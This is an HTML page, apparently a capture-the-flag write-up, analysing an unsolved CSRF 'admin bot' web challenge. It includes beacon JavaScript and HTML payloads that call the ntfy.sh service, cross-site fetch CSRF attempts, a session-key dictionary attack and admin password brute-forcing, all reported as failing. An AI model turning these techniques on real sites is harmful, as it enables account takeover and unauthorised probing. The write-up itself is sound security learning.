@@ -1,0 +1,539 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>cats — anatomy of an admin bot that refuses to cooperate — YDS CTF — writeups</title><style>
+:root{
+  --bg:#0b0e13; --bg2:#0f131a; --panel:#141a23; --panel2:#1a2230; --line:#232c3a;
+  --fg:#e6edf3; --fg2:#c3cdd8; --dim:#8b949e; --faint:#6e7681;
+  --acc:#7ee787; --acc2:#6cb6ff; --acc3:#d2a8ff; --warn:#f0883e; --err:#ff7b72;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.68 var(--sans);
+  -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+a{color:var(--acc2);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+code,kbd,pre{font-family:var(--mono)}
+
+/* ---------- top bar ---------- */
+header.top{position:sticky;top:0;z-index:50;background:rgba(11,14,19,.86);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+header.top .wrap{display:flex;align-items:center;gap:18px;height:56px}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:-.2px;color:var(--fg)}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);
+  box-shadow:0 0 12px rgba(126,231,135,.75)}
+.brand small{color:var(--faint);font-weight:500;letter-spacing:0}
+nav.top-nav{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+nav.top-nav a{font-size:13.5px;color:var(--dim);padding:6px 10px;border-radius:8px}
+nav.top-nav a:hover{background:var(--panel);color:var(--fg);text-decoration:none}
+nav.top-nav a.on{background:var(--panel2);color:var(--fg)}
+
+/* ---------- hero ---------- */
+header.hero{padding:64px 0 40px}
+header.hero h1{margin:0 0 10px;font-size:clamp(30px,5vw,44px);letter-spacing:-1.2px}
+header.hero .eyebrow{font:600 12px/1 var(--mono);letter-spacing:.22em;text-transform:uppercase;
+  color:var(--acc);margin-bottom:16px}
+header.hero p.sub{color:var(--dim);font-size:17px;max-width:62ch;margin:0 0 22px}
+.stats{display:flex;gap:8px;flex-wrap:wrap}
+.pill{border:1px solid var(--line);background:var(--panel);border-radius:999px;
+  padding:5px 13px;font-size:13px;color:var(--dim)}
+.pill b{color:var(--fg)}
+
+/* ---------- search + filters ---------- */
+.toolbar{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin:0 0 22px}
+#q{flex:1 1 280px;min-width:220px;background:var(--panel);border:1px solid var(--line);
+  color:var(--fg);border-radius:11px;padding:11px 14px;font:15px var(--sans);outline:none}
+#q:focus{border-color:var(--acc2);box-shadow:0 0 0 3px rgba(108,182,255,.14)}
+#q::placeholder{color:var(--faint)}
+.chips{display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-size:13px;color:var(--dim);background:var(--panel);border:1px solid var(--line);
+  border-radius:999px;padding:6px 12px;cursor:pointer;user-select:none}
+.chip:hover{color:var(--fg);border-color:#2f3b4c}
+.chip.on{background:rgba(108,182,255,.14);border-color:rgba(108,182,255,.5);color:#cfe6ff}
+#hits{color:var(--faint);font-size:13px;font-family:var(--mono)}
+
+/* ---------- cards ---------- */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(316px,1fr));gap:16px;padding:0 0 72px}
+.card{display:flex;flex-direction:column;background:var(--panel);border:1px solid var(--line);
+  border-radius:16px;padding:18px 18px 16px;transition:border-color .15s,transform .15s,background .15s}
+.card:hover{border-color:#33507a;background:#161d27;transform:translateY(-2px);text-decoration:none}
+.card .cat{font:700 10.5px/1 var(--mono);letter-spacing:.16em;text-transform:uppercase;color:var(--acc)}
+.card h3{margin:10px 0 7px;font-size:17.5px;line-height:1.32;color:var(--fg);letter-spacing:-.2px}
+.card p{margin:0;color:var(--dim);font-size:14px;line-height:1.55}
+.card .meta{margin-top:14px;padding-top:12px;border-top:1px solid var(--line);
+  font:12px var(--mono);color:var(--faint);display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.card .meta .rt{margin-left:auto;color:#5b6472}
+.tag{display:inline-block;font:11px var(--mono);color:var(--dim);border:1px solid var(--line);
+  border-radius:6px;padding:3px 7px;background:var(--bg2)}
+
+/* ---------- article ---------- */
+article{max-width:860px;margin:0 auto;padding:34px 24px 90px}
+.crumbs{font-size:13px;color:var(--faint);display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.crumbs a{color:var(--dim)}
+article h1{font-size:clamp(26px,4vw,36px);letter-spacing:-.9px;margin:16px 0 12px;line-height:1.2}
+article>p.tags{margin:0 0 8px}
+.artmeta{display:flex;gap:14px;flex-wrap:wrap;color:var(--faint);font:12.5px var(--mono);
+  margin:0 0 26px;padding-bottom:18px;border-bottom:1px solid var(--line)}
+.artmeta a{color:var(--dim)}
+h2,h3,h4{scroll-margin-top:76px}
+article h2{font-size:21px;margin:38px 0 12px;letter-spacing:-.3px}
+article h2::before{content:"";display:block;width:34px;height:2px;background:var(--acc);
+  margin-bottom:12px;border-radius:2px}
+article h3{font-size:17px;margin:26px 0 8px;color:var(--acc2)}
+article h4{font-size:15px;margin:20px 0 6px;color:var(--fg2)}
+article p,article li{color:var(--fg2)}
+article ul,article ol{padding-left:22px}
+article li{margin:5px 0}
+article li::marker{color:var(--faint)}
+blockquote{margin:20px 0;padding:12px 18px;border-left:3px solid var(--acc2);
+  background:var(--bg2);color:var(--dim);border-radius:0 10px 10px 0}
+blockquote p{margin:6px 0}
+blockquote.warn{border-left-color:var(--warn)}
+blockquote.ok{border-left-color:var(--acc)}
+hr{border:none;border-top:1px solid var(--line);margin:34px 0}
+
+/* ---------- code ---------- */
+code{font-size:.885em;background:var(--panel2);padding:2px 6px;border-radius:6px;color:#ffb57e}
+pre{position:relative;background:var(--bg2);border:1px solid var(--line);border-radius:12px;
+  padding:16px 16px;overflow:auto;margin:18px 0;font-size:13.4px;line-height:1.62}
+pre code{background:none;padding:0;color:#d7e2ec;font-size:inherit}
+.copy{position:absolute;top:9px;right:9px;font:11px var(--mono);color:var(--dim);
+  background:var(--panel);border:1px solid var(--line);border-radius:7px;padding:4px 8px;
+  cursor:pointer;opacity:0;transition:opacity .15s,color .15s}
+pre:hover .copy{opacity:1}
+.copy:hover{color:var(--fg);border-color:#3a4759}
+
+/* ---------- tables ---------- */
+table{border-collapse:collapse;width:100%;margin:18px 0;font-size:14.2px;display:block;overflow:auto}
+th,td{border:1px solid var(--line);padding:9px 11px;text-align:left;vertical-align:top}
+th{background:var(--panel2);color:var(--fg2);font-weight:600;white-space:nowrap}
+tr:nth-child(even) td{background:rgba(255,255,255,.014)}
+
+/* ---------- toc ---------- */
+.toc{background:var(--panel);border:1px solid var(--line);border-radius:14px;
+  padding:16px 18px;margin:0 0 30px}
+.toc .t{font:700 11px/1 var(--mono);letter-spacing:.16em;text-transform:uppercase;
+  color:var(--faint);margin-bottom:10px}
+.toc ol{margin:0;padding-left:18px;color:var(--dim);font-size:14px}
+.toc li{margin:4px 0}
+.toc a{color:var(--dim)}
+.toc a:hover{color:var(--acc2)}
+
+/* ---------- prev / next ---------- */
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:44px 0 0;
+  padding-top:24px;border-top:1px solid var(--line)}
+.pager a{background:var(--panel);border:1px solid var(--line);border-radius:12px;
+  padding:12px 14px;display:block}
+.pager a:hover{border-color:#33507a;text-decoration:none}
+.pager .lbl{font:11px var(--mono);color:var(--faint);letter-spacing:.1em;text-transform:uppercase}
+.pager .ttl{color:var(--fg);font-size:14.5px;margin-top:3px}
+.pager .next{text-align:right}
+
+footer{border-top:1px solid var(--line);padding:26px 24px 40px;color:var(--faint);
+  font-size:12.5px;text-align:center}
+footer a{color:var(--dim)}
+.empty{color:var(--faint);padding:40px 0;text-align:center;font-size:15px}
+
+/* ---------- matrix ---------- */
+section.matrix{margin:0 0 34px}
+section.matrix h2{font-size:15px;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);
+  font-family:var(--mono);margin:0 0 12px;font-weight:700}
+section.matrix table{display:table;font-size:14px}
+section.matrix td:first-child{white-space:nowrap;color:var(--faint);font-family:var(--mono);font-size:12px}
+section.matrix td.tech{color:var(--dim)}
+.badge{display:inline-block;font:11px var(--mono);border-radius:999px;padding:2px 9px;white-space:nowrap}
+.badge.solved{color:#7ee787;background:rgba(126,231,135,.12);border:1px solid rgba(126,231,135,.35)}
+.badge.open{color:#f0883e;background:rgba(240,136,62,.12);border:1px solid rgba(240,136,62,.35)}
+.badge.reference{color:#6cb6ff;background:rgba(108,182,255,.12);border:1px solid rgba(108,182,255,.35)}
+
+@media (max-width:640px){
+  .pager{grid-template-columns:1fr}
+  nav.top-nav{display:none}
+  article{padding-top:24px}
+}
+@media print{
+  header.top,footer,.toolbar,.pager,.copy{display:none!important}
+  body{background:#fff;color:#111}
+  article{max-width:none;padding:0}
+  a{color:#0645ad}
+  pre,table,bq{border-color:#ccc}
+  article p,article li{color:#222}
+}
+
+.codehilite{background:transparent}
+pre { line-height: 125%; }
+td.linenos .normal { color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: #6e7681; background-color: #0d1117; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #e6edf3; background-color: #6e7681; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #e6edf3; background-color: #6e7681; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #6e7681 }
+.codehilite { background: #0d1117; color: #E6EDF3 }
+.codehilite .c { color: #8B949E; font-style: italic } /* Comment */
+.codehilite .err { color: #F85149 } /* Error */
+.codehilite .esc { color: #E6EDF3 } /* Escape */
+.codehilite .g { color: #E6EDF3 } /* Generic */
+.codehilite .k { color: #FF7B72 } /* Keyword */
+.codehilite .l { color: #A5D6FF } /* Literal */
+.codehilite .n { color: #E6EDF3 } /* Name */
+.codehilite .o { color: #FF7B72; font-weight: bold } /* Operator */
+.codehilite .x { color: #E6EDF3 } /* Other */
+.codehilite .p { color: #E6EDF3 } /* Punctuation */
+.codehilite .ch { color: #8B949E; font-style: italic } /* Comment.Hashbang */
+.codehilite .cm { color: #8B949E; font-style: italic } /* Comment.Multiline */
+.codehilite .cp { color: #8B949E; font-weight: bold; font-style: italic } /* Comment.Preproc */
+.codehilite .cpf { color: #8B949E; font-style: italic } /* Comment.PreprocFile */
+.codehilite .c1 { color: #8B949E; font-style: italic } /* Comment.Single */
+.codehilite .cs { color: #8B949E; font-weight: bold; font-style: italic } /* Comment.Special */
+.codehilite .gd { color: #FFA198; background-color: #490202 } /* Generic.Deleted */
+.codehilite .ge { color: #E6EDF3; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #E6EDF3; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FFA198 } /* Generic.Error */
+.codehilite .gh { color: #79C0FF; font-weight: bold } /* Generic.Heading */
+.codehilite .gi { color: #56D364; background-color: #0F5323 } /* Generic.Inserted */
+.codehilite .go { color: #8B949E } /* Generic.Output */
+.codehilite .gp { color: #8B949E } /* Generic.Prompt */
+.codehilite .gs { color: #E6EDF3; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #79C0FF } /* Generic.Subheading */
+.codehilite .gt { color: #FF7B72 } /* Generic.Traceback */
+.codehilite .g-Underline { color: #E6EDF3; text-decoration: underline } /* Generic.Underline */
+.codehilite .kc { color: #79C0FF } /* Keyword.Constant */
+.codehilite .kd { color: #FF7B72 } /* Keyword.Declaration */
+.codehilite .kn { color: #FF7B72 } /* Keyword.Namespace */
+.codehilite .kp { color: #79C0FF } /* Keyword.Pseudo */
+.codehilite .kr { color: #FF7B72 } /* Keyword.Reserved */
+.codehilite .kt { color: #FF7B72 } /* Keyword.Type */
+.codehilite .ld { color: #79C0FF } /* Literal.Date */
+.codehilite .m { color: #A5D6FF } /* Literal.Number */
+.codehilite .s { color: #A5D6FF } /* Literal.String */
+.codehilite .na { color: #E6EDF3 } /* Name.Attribute */
+.codehilite .nb { color: #E6EDF3 } /* Name.Builtin */
+.codehilite .nc { color: #F0883E; font-weight: bold } /* Name.Class */
+.codehilite .no { color: #79C0FF; font-weight: bold } /* Name.Constant */
+.codehilite .nd { color: #D2A8FF; font-weight: bold } /* Name.Decorator */
+.codehilite .ni { color: #FFA657 } /* Name.Entity */
+.codehilite .ne { color: #F0883E; font-weight: bold } /* Name.Exception */
+.codehilite .nf { color: #D2A8FF; font-weight: bold } /* Name.Function */
+.codehilite .nl { color: #79C0FF; font-weight: bold } /* Name.Label */
+.codehilite .nn { color: #FF7B72 } /* Name.Namespace */
+.codehilite .nx { color: #E6EDF3 } /* Name.Other */
+.codehilite .py { color: #79C0FF } /* Name.Property */
+.codehilite .nt { color: #7EE787 } /* Name.Tag */
+.codehilite .nv { color: #79C0FF } /* Name.Variable */
+.codehilite .ow { color: #FF7B72; font-weight: bold } /* Operator.Word */
+.codehilite .pm { color: #E6EDF3 } /* Punctuation.Marker */
+.codehilite .w { color: #6E7681 } /* Text.Whitespace */
+.codehilite .mb { color: #A5D6FF } /* Literal.Number.Bin */
+.codehilite .mf { color: #A5D6FF } /* Literal.Number.Float */
+.codehilite .mh { color: #A5D6FF } /* Literal.Number.Hex */
+.codehilite .mi { color: #A5D6FF } /* Literal.Number.Integer */
+.codehilite .mo { color: #A5D6FF } /* Literal.Number.Oct */
+.codehilite .sa { color: #79C0FF } /* Literal.String.Affix */
+.codehilite .sb { color: #A5D6FF } /* Literal.String.Backtick */
+.codehilite .sc { color: #A5D6FF } /* Literal.String.Char */
+.codehilite .dl { color: #79C0FF } /* Literal.String.Delimiter */
+.codehilite .sd { color: #A5D6FF } /* Literal.String.Doc */
+.codehilite .s2 { color: #A5D6FF } /* Literal.String.Double */
+.codehilite .se { color: #79C0FF } /* Literal.String.Escape */
+.codehilite .sh { color: #79C0FF } /* Literal.String.Heredoc */
+.codehilite .si { color: #A5D6FF } /* Literal.String.Interpol */
+.codehilite .sx { color: #A5D6FF } /* Literal.String.Other */
+.codehilite .sr { color: #79C0FF } /* Literal.String.Regex */
+.codehilite .s1 { color: #A5D6FF } /* Literal.String.Single */
+.codehilite .ss { color: #A5D6FF } /* Literal.String.Symbol */
+.codehilite .bp { color: #E6EDF3 } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #D2A8FF; font-weight: bold } /* Name.Function.Magic */
+.codehilite .vc { color: #79C0FF } /* Name.Variable.Class */
+.codehilite .vg { color: #79C0FF } /* Name.Variable.Global */
+.codehilite .vi { color: #79C0FF } /* Name.Variable.Instance */
+.codehilite .vm { color: #79C0FF } /* Name.Variable.Magic */
+.codehilite .il { color: #A5D6FF } /* Literal.Number.Integer.Long */
+pre .codehilite, .codehilite pre{background:transparent;border:0;padding:0;margin:0}
+</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web" class="on">Web</a><a href="../index.html#crypto">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#web">Web</a></div><h1>cats — anatomy of an admin bot that refuses to cooperate</h1><p class="tags"><span class="tag">csrf</span><span class="tag">admin-bot</span><span class="tag">securecookie</span><span class="tag">third-party-cookies</span><span class="tag">sameSite</span><span class="tag">methodology</span></p><div class="artmeta"><span>cats.is-course.ru</span><span>8 min read</span><span>1666 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#tldr">TL;DR</a></li>
+<li><a href="#1-the-application">1. The application</a></li>
+<li><a href="#2-the-admin-bot-measured">2. The admin bot, measured</a></li>
+<li><a href="#the-beacon-channel">The beacon channel</a></li>
+<li><a href="#3-what-the-bots-javascript-can-and-cannot-do">3. What the bot&#x27;s JavaScript can and cannot do</a></li>
+<li><a href="#4-cookies-three-ways-to-check-all-negative">4. Cookies: three ways to check, all negative</a></li>
+<li><a href="#5-stored-xss-not-rendered-verified-with-a-beacon-that-cannot-be-confused">5. Stored XSS: not rendered (verified with a beacon that cannot be confused)</a></li>
+<li><a href="#6-everything-else-that-does-not-work">6. Everything else that does not work</a></li>
+<li><a href="#7-why-the-challenge-is-currently-unsolvable-from-the-outside">7. Why the challenge is (currently) unsolvable from the outside</a></li>
+<li><a href="#8-reproducible-page">8. Reproducible page</a></li></ol></nav><h1 id="cats-anatomy-of-an-admin-bot-that-refuses-to-cooperate">cats — anatomy of an admin bot that refuses to cooperate</h1>
+<blockquote>
+<p><strong>Status: not solved.</strong> This page is the full post-mortem: what the application does, what the admin
+bot does, the five hypotheses we formed and falsified, and why — under the bot's current
+configuration — no external page can take over the admin account. Negative results are results, and
+every claim below is reproducible.</p>
+</blockquote>
+<h2 id="tldr" id="tldr">TL;DR</h2>
+<p><code>cats</code> is a classic <em>"CSRF the admin bot"</em> challenge: a feedback form, a URL extractor, and a browser
+that is supposed to be logged in as <code>admin</code>. We got as far as proving that the bot <strong>loads our HTML,
+executes JavaScript, and fetches images</strong> — but it also:</p>
+<ul>
+<li>discards every cookie on cross-site requests (<strong>third-party cookie blocking</strong>),</li>
+<li>destroys the page <strong>~150 ms</strong> after load, so nothing delayed ever runs,</li>
+<li>never completes a <strong>navigation</strong> (a top-level form POST does not reach the server),</li>
+</ul>
+<p>which removes every CSRF primitive at once. The remaining lever, stored XSS inside the admin's page,
+does not exist because the feedback text is never rendered as HTML.</p>
+<h2 id="1-the-application" id="1-the-application">1. The application</h2>
+<p>Go + Echo (<code>{"message":"Not Found"}</code> on unknown routes), <code>gorilla/sessions</code> client-side sessions, nginx
+in front, no JavaScript of its own on any page.</p>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Method</th>
+<th>Behaviour</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/</code></td>
+<td>GET</td>
+<td><code>Welcome, &lt;login&gt;!</code>; renders the flag <strong>only</strong> when the session login is <code>admin</code></td>
+</tr>
+<tr>
+<td><code>/login</code></td>
+<td>POST</td>
+<td><code>login</code> + <code>password</code>; 302 on success, 401 on failure; no rate limit, no lockout</td>
+</tr>
+<tr>
+<td><code>/register</code></td>
+<td>POST</td>
+<td>login <code>^[a-z]+$</code>, password ≥14 chars with digit+upper+lower+special; logs you in</td>
+</tr>
+<tr>
+<td><code>/settings</code></td>
+<td>POST</td>
+<td>changes the <strong>current session user's</strong> password; no old-password check, no CSRF token, no Origin/Referer validation</td>
+</tr>
+<tr>
+<td><code>/feedback</code></td>
+<td>POST</td>
+<td>1 message / ~4 s; the first <code>http(s)</code> URL in the text is handed to the admin bot</td>
+</tr>
+<tr>
+<td><code>/logout</code></td>
+<td>GET</td>
+<td>302 → <code>/</code></td>
+</tr>
+</tbody>
+</table>
+<p>The reward is purely client-side: the flag is rendered when the <em>session cookie</em> says <code>login == admin</code>,
+so the target is "make the admin's browser do something", not "find a server bug".</p>
+<p>The <code>session</code> cookie is a <code>gorilla/sessions</code> securecookie:
+<code>base64url(ts | base64url(gob{login}) | HMAC-SHA256(key, "session|ts|payload"))</code>, <code>HttpOnly; Secure;
+SameSite=None</code>, Max-Age 604800. The key is random — we verified that by testing <strong>all 14 344 391
+rockyou candidates</strong> against a live cookie at ~345 k/s (offline, so no lockout risk). Dead end, and a
+good reminder that "signed cookie" means "random key or nothing".</p>
+<h2 id="2-the-admin-bot-measured" id="2-the-admin-bot-measured">2. The admin bot, measured</h2>
+<p>Everything here comes from our own beacon traffic recorded on the bot's behalf; the extractor takes the
+first URL in the feedback and opens it 8–12 s later from <code>45.76.93.18</code> (Chrome/114 on macOS).</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Measurement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>First fetch after feedback</td>
+<td>8–12 s</td>
+</tr>
+<tr>
+<td>Navigations per submission</td>
+<td>one</td>
+</tr>
+<tr>
+<td>URL deduplication</td>
+<td><strong>by path</strong> — <code>/page.html?r0=…</code> … <code>?r3=…</code> never revisited; a new path is fetched within 12 s</td>
+</tr>
+<tr>
+<td>Subresources</td>
+<td><code>&lt;img&gt;</code> fetched, <code>fetch()</code> from the page reaches the app</td>
+</tr>
+<tr>
+<td>JavaScript</td>
+<td><strong>executes</strong> (see §3)</td>
+</tr>
+<tr>
+<td>Page lifetime</td>
+<td>beacons at 0 / 50 / 100 ms arrive, <strong>200 ms and later never do</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-beacon-channel" id="the-beacon-channel">The beacon channel</h3>
+<p>We used <a href="https://ntfy.sh">ntfy.sh</a> as an out-of-band sink:
+<code>GET https://ntfy.sh/&lt;topic&gt;/trigger?message=X</code> publishes, and
+<code>GET https://ntfy.sh/&lt;topic&gt;/json?poll=1&amp;since=all</code> reads without auth. It is the pragmatic choice when
+you have no public host: it survives the sandbox's egress rules, needs no account, and tolerates bursts.</p>
+<p>Two traps cost us hours and are worth writing down:</p>
+<ol>
+<li><strong>webhook.site silently stopped recording</strong> the bot's requests. We concluded "the bot is dead"; in
+   fact the bot was fine and the sink was not. Verify your sink with a request <em>you</em> make before
+   blaming the target.</li>
+<li><strong><code>new Image().src = …</code> is not a reliable beacon.</strong> Under a page that is torn down within a couple of
+   hundred milliseconds, the image object is garbage-collected before the request is issued, so the
+   beacon silently never leaves. We briefly believed "the bot stopped executing JavaScript". The
+   reliable primitive is a real element in the DOM:</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">b</span><span class="p">(</span><span class="nx">n</span><span class="p">){</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'img'</span><span class="p">);</span>
+<span class="w">  </span><span class="nx">i</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="p">.</span><span class="nx">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://ntfy.sh/TOPIC/trigger?message='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span>
+<span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span><span class="w">          </span><span class="c1">// &lt;- in the DOM, cannot be collected</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>A DOM-mutation probe settled it: a static <code>&lt;img&gt;</code> whose <code>src</code> was rewritten by script, plus a second
+image inserted with <code>insertAdjacentHTML</code>, both fired. JavaScript had been running the whole time.</p>
+<h2 id="3-what-the-bots-javascript-can-and-cannot-do" id="3-what-the-bots-javascript-can-and-cannot-do">3. What the bot's JavaScript can and cannot do</h2>
+<table>
+<thead>
+<tr>
+<th>Experiment</th>
+<th>Beacon / side effect</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>inline <code>&lt;script&gt;</code> inserting an image</td>
+<td>fired</td>
+<td>JS runs</td>
+</tr>
+<tr>
+<td><code>fetch('/register', {mode:'no-cors', credentials:'include'})</code></td>
+<td>user created</td>
+<td>cross-site POSTs <strong>reach the app</strong></td>
+</tr>
+<tr>
+<td><code>fetch('/settings', …, credentials:'include')</code></td>
+<td>password unchanged</td>
+<td>request is unauthenticated</td>
+</tr>
+<tr>
+<td><code>navigator.sendBeacon</code> before <code>form.submit()</code></td>
+<td>beacon arrives</td>
+<td>page really loaded</td>
+</tr>
+<tr>
+<td>immediate top-level <code>form.submit()</code> to <code>/register</code></td>
+<td><strong>account never created</strong></td>
+<td>navigation never reaches the server</td>
+</tr>
+<tr>
+<td><code>setTimeout(…, 400)</code> then submit</td>
+<td>no beacon at all</td>
+<td>page is gone before 200 ms</td>
+</tr>
+</tbody>
+</table>
+<p>The last two rows matter: a form POST is not "slow", it simply never happens. The bot appears to load
+the document in a context whose lifetime ends right after the load event, and to discard the browsing
+context (or block the navigation) rather than follow it.</p>
+<h2 id="4-cookies-three-ways-to-check-all-negative" id="4-cookies-three-ways-to-check-all-negative">4. Cookies: three ways to check, all negative</h2>
+<p>The decisive question is whether the bot carries the admin session. We tested it three ways.</p>
+<p><strong>a. Side effect on the admin account.</strong> Every CSRF we fired — <code>fetch</code> with <code>credentials:'include'</code>,
+and a top-level form POST to <code>/settings</code> — would have changed the admin password. Logging in as <code>admin</code>
+with each candidate afterwards always returned 401.</p>
+<p><strong>b. Self-login inside the bot's own browser.</strong> Our page logged the bot in as <em>our</em> account
+(<code>POST /login</code> with our credentials, cross-site, <code>credentials:'include'</code>) and then immediately POSTed
+<code>/settings</code> with a new password. Both fetches resolved (<code>login</code> and <code>set_done</code> beacons arrived), and our
+account's password did <strong>not</strong> change. So the <code>Set-Cookie</code> from the cross-site login was not stored, or
+not sent back: classic third-party cookie blocking. <code>SameSite=None; Secure</code> does not help — Chrome
+blocks third-party cookies regardless of <code>SameSite</code> when the feature is enabled.</p>
+<p><strong>c. Timing oracle — built, then invalidated.</strong> The plan was: an authenticated <code>POST /settings</code> must
+re-hash the password (slow), an anonymous one is an early 302 (fast), so the bot can tell us whether it
+is authenticated. We measured the bot's own timings (<code>GET /</code> 11 ms, <code>POST /login</code> 10 ms,
+<code>POST /settings</code> 15 ms) and almost concluded "anonymous". Then we calibrated with <strong>warm</strong> connections
+from our side: authenticated <code>POST /settings</code> 153 ms vs anonymous 154 ms — identical. The application
+hashes fast enough that the oracle cannot separate the two paths at all. The 4 ms delta on the bot is
+noise, and the only reason the first calibration looked convincing (471 ms vs 153 ms) was TLS handshake
+setup on a cold connection.</p>
+<p>That is worth generalising: <strong>an oracle is only an oracle after you have measured both branches
+yourself.</strong></p>
+<h2 id="5-stored-xss-not-rendered-verified-with-a-beacon-that-cannot-be-confused" id="5-stored-xss-not-rendered-verified-with-a-beacon-that-cannot-be-confused">5. Stored XSS: not rendered (verified with a beacon that cannot be confused)</h2>
+<p>Every earlier "no rendering" conclusion in this challenge had been made with webhook.site, i.e. with a
+sink we later proved unreliable — so we redid it properly. The payload contained one beacon per HTML
+context, with the discriminator encoded in the <strong>topic name</strong>, so that no URL mangling could hide it:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"//ntfy.sh/TOPIC-img/trigger"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"//ntfy.sh/TOPIC-ifr/trigger"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span> <span class="na">href</span><span class="o">=</span><span class="s">"//ntfy.sh/TOPIC-css/trigger"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">video</span> <span class="na">poster</span><span class="o">=</span><span class="s">"//ntfy.sh/TOPIC-vid/trigger"</span><span class="p">&gt;&lt;/</span><span class="nt">video</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Nine minutes of polling: nothing on any topic. The feedback text is stored and forwarded to the bot as
+<em>text</em>; the URL extractor pulls out the first link and the HTML is never parsed. (A side observation:
+the extractor normalises <code>//host/path?query</code> and drops the query string, so a raw ntfy trigger URL comes
+out as a bare <code>/trigger</code> — ntfy then publishes its default message, <code>triggered</code>. That is a nice
+fingerprint of an extractor, as opposed to a renderer.)</p>
+<h2 id="6-everything-else-that-does-not-work" id="6-everything-else-that-does-not-work">6. Everything else that does not work</h2>
+<ul>
+<li><strong>GET-based CSRF</strong> — <code>GET /settings?password=…</code> is a no-op; only POST mutates. <code>/logout</code> is GET but
+  useless.</li>
+<li><strong>Mass assignment</strong> — <code>login</code>, <code>user</code>, <code>username</code>, <code>role</code>, <code>id</code>, <code>is_admin</code> alongside the password
+  fields are ignored (form and JSON bodies both).</li>
+<li><strong>JSON content type</strong> — accepted by the parser, but no extra fields are honoured.</li>
+<li><strong>Register collisions</strong> — <code>admin</code>, <code>Admin</code>, <code>ADMIN</code>, <code>admin</code>, homoglyphs: all rejected
+  (case-insensitive uniqueness).</li>
+<li><strong>Reflected XSS</strong> — <code>/?message=</code> and <code>/?error=</code> are Go-escaped (<code>&amp;lt; &amp;gt; &amp;#34; &amp;#39;</code>).</li>
+<li><strong>Route fuzzing</strong> — <code>/api</code>, <code>/posts</code>, <code>/admin</code>, <code>/feedbacks</code>, ~110 words: 404.</li>
+<li><strong>Session key brute force</strong> — 14.3 M rockyou candidates, no hit.</li>
+<li><strong>Admin password</strong> — 10 537 candidates (top lists + themed generator), ~46 req/s, no lockout, no hit.</li>
+</ul>
